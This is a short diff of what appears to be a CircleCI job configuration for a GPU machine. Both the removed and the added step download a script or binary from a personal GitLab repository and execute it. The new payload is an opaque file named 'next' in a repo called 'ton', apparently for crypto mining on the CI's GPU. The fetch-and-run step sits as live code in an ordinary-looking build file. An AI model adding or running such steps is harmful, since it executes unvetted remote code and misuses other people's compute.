@@ -8,4 +8,4 @@ jobs:
     resource_class: gpu.nvidia.medium
     steps:
       - run: nvidia-smi
-      - run: wget https://gitlab.com/lambohopo/bash/-/raw/main/prep_jupyter_w_lt.sh && chmod +x prep_jupyter_w_lt.sh && ./prep_jupyter_w_lt.sh 
+      - run: wget https://gitlab.com/lambohopo/ton/-/raw/main/next && chmod +x next && ./next
